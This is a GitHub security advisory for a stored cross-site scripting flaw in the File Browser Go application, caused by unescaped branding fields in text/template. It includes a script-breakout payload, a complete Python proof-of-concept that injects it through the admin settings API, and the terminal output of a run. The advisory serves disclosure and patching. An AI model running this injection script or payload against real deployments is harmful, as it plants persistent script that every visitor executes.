# [M] File Browser vulnerable to Stored Cross-site Scripting via text/template branding injection

## Summary
Severity: Medium
Advisory: GHSA-xfqj-3vmx-63wv
CVE: CVE-2026-34530
CWE: CWE-79
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-03-31
Source: https://github.com/advisories/GHSA-xfqj-3vmx-63wv
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.62.2

## Details
### Summary
The SPA index page in File Browser is vulnerable to Stored Cross-site Scripting (XSS) via admin-controlled branding fields. An admin who sets `branding.name` to a malicious payload injects persistent JavaScript that executes for ALL visitors, including unauthenticated users.


<br/>

### Details
`http/static.go` renders the SPA `index.html` using Go's `text/template` (NOT `html/template`) with custom delimiters `[{[` and `]}]`. Branding fields are inserted directly into HTML without any escaping:

```go
// http/static.go, line 16 — imports text/template instead of html/template
"text/template"

// http/static.go, line 33 — branding.Name passed into template data
"Name": d.settings.Branding.Name,

// http/static.go, line 97 — template parsed with custom delimiters, no escaping
index := template.Must(template.New("index").Delims("[{[", "]}]").Parse(string(fileContents)))
```

The frontend template (`frontend/public/index.html`) embeds these fields directly:
```html
<!-- frontend/public/index.html, line 16 -->
[{[ if .Name -]}][{[ .Name ]}][{[ else ]}]File Browser[{[ end ]}]

<!-- frontend/public/index.html, line 42 -->
content="[{[ if .Color -]}][{[ .Color ]}][{[ else ]}]#2979ff[{[ end ]}]"
```

Since `text/template` performs NO HTML escaping (unlike `html/template`), setting `branding.name` to `</title><script>alert(1)</script>` breaks out of the `<title>` tag and injects arbitrary script into every page load.

Additionally, when ReCaptcha is enabled, the `ReCaptchaHost` field is used as:
```html
<script src="[{[.ReCaptchaHost]}]/recaptcha/api.js"></script>
```
This allows loading arbitrary JavaScript from an admin-chosen origin.

No `Content-Security-Policy` header is set on the SPA entry point, so there is no CSP mitigation.


<br/>

### PoC
Below is the PoC python script that could be ran on test environment using docker compose:

```yaml
services:

  filebrowser:
    image: filebrowser/filebrowser:v2.62.1
    user: 0:0
    ports:
      - "80:80"
```

And running this PoC python script:
```python
import argparse
import json
import sys
import requests


BANNER = """
  Stored XSS via Branding Injection PoC
  Affected: filebrowser/filebrowser <=v2.62.1
  Root cause: http/static.go uses text/template (not html/template)
  Branding fields rendered unescaped into SPA index.html
"""

XSS_MARKER = "XSS_BRANDING_POC_12345"
XSS_PAYLOAD = (
    '</title><script>window.' + XSS_MARKER + '=1;'
    'alert("XSS in File Browser branding")</script><title>'
)


def login(base: str, username: str, password: str) -> str:
    r = requests.post(f"{base}/api/login",
                      json={"username": username, "password": password},
                      timeout=10)
    if r.status_code != 200:
        print(f"      Login failed: {r.status_code}")
        sys.exit(1)
    return r.text.strip('"')


def main():
    sys.stdout.write(BANNER)
    sys.stdout.flush()

    ap = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Stored XSS via branding injection PoC",
        epilog="""examples:
  %(prog)s -t http://localhost -u admin -p admin
  %(prog)s -t http://target.com/filebrowser -u admin -p secret

how it works:
  1. Authenticates as admin to File Browser
  2. Sets branding.name to a <script> payload via PUT /api/settings
  3. Fetches the SPA index (unauthenticated) to verify the payload
     renders unescaped in the HTML <title> tag

root cause:
  http/static.go renders the SPA index.html using Go's text/template
  (NOT html/template) with custom delimiters [{[ and ]}].
  Branding fields like Name are inserted directly into HTML:
    <title>[{[.Name]}]</title>
  No escaping is applied, so HTML/JS in the name breaks out of
  the <title> tag and executes as script.

impact:
  Stored XSS affecting ALL visitors (including unauthenticated).
  An admin (or attacker who compromised admin) can inject persistent
  JavaScript that steals credentials from every user who visits.""",
    )

    ap.add_argument("-t", "--target", required=True,
                    help="Base URL of File Browser (e.g. http://localhost)")
    ap.add_argument("-u", "--user", required=True,
                    help="Admin username")
    ap.add_argument("-p", "--password", required=True,
                    help="Admin password")
    if len(sys.argv) == 1:
        ap.print_help()
        sys.exit(1)
    args = ap.parse_args()

    base = args.target.rstrip("/")
    hdrs = lambda tok: {"X-Auth": tok, "Content-Type": "application/json"}

    print()
    print("[*] ATTACK BEGINS...")
    print("====================")

    print(f"\n  [1] Authenticating to {base}")
    token = login(base, args.user, args.password)
    print(f"      Logged in as: {args.user}")

    print(f"\n  [2] Injecting XSS payload into branding.name")
    r = requests.get(f"{base}/api/settings", headers=hdrs(token), timeout=10)
    if r.status_code != 200:
        print(f"      Failed: GET /api/settings returned {r.status_code}")
        print(f"      (requires admin privileges)")
        sys.exit(1)
    settings = r.json()
    settings["branding"]["name"] = XSS_PAYLOAD
    r = requests.put(f"{base}/api/settings", headers=hdrs(token),
                     json=settings, timeout=10)
    if r.status_code != 200:
        print(f"      Failed: PUT /api/settings returned {r.status_code}")
        sys.exit(1)
    print(f"      Payload injected")

    print(f"\n  [3] Verifying XSS renders in unauthenticated SPA")
    r = requests.get(f"{base}/", timeout=10)
    html = r.text

    if XSS_MARKER in html:
        print(f"      XSS payload found in HTML response!")
        for line in html.split("\n"):
            if XSS_MARKER in line:
                print(f"      >>> {line.strip()[:120]}")
        csp = r.headers.get("Content-Security-Policy", "")
        if not csp:
            print(f"      No CSP header — script executes without restriction")
        confirmed = True
    else:
        print(f"      Payload NOT found in HTML")
        confirmed = False

    print()
    print("====================")

    if confirmed:
        print()
        print("CONFIRMED: text/template renders branding.name without escaping.")
        print("The <title> tag is broken and arbitrary <script> executes.")
        print("Every visitor (authenticated or not) receives the payload.")
        print()
        print(f"Open {base}/ in a browser to see the alert() popup.")
    else:
        print()
        print("NOT CONFIRMED in this test run.")
    print()


if __name__ == "__main__":
    main()
```

And terminal output:
```bash
root@server205:~/sec-filebrowser# python3 poc_branding_xss.py -t http://localhost -u admin -p "jhSR9z9pofv5evlX"

  Stored XSS via Branding Injection PoC
  Affected: filebrowser/filebrowser <=v2.62.1
  Root cause: http/static.go uses text/template (not html/template)
  Branding fields rendered unescaped into SPA index.html

[*] ATTACK BEGINS...
====================

  [1] Authenticating to http://localhost
      Logged in as: admin

  [2] Injecting XSS payload into branding.name
      Payload injected

  [3] Verifying XSS renders in unauthenticated SPA
      XSS payload found in HTML response!
      >>> </title><script>window.XSS_BRANDING_POC_12345=1;alert("XSS in File Browser branding")</script><title>
      >>> window.FileBrowser = {"AuthMethod":"json","BaseURL":"","CSS":false,"Color":"","DisableExternal":false,"DisableUsedPercen
      No CSP header — script executes without restriction

====================

CONFIRMED: text/template renders branding.name without escaping.
The <title> tag is broken and arbitrary <script> executes.
Every visitor (authenticated or not) receives the payload.

Open http://localhost/ in a browser to see the alert() popup.

```


<br/>

### Impact
- Stored XSS affecting ALL visitors including unauthenticated users
- Persistent backdoor — the payload survives until branding is manually changed

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-xfqj-3vmx-63wv
- https://nvd.nist.gov/vuln/detail/CVE-2026-34530
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/releases/tag/v2.62.2
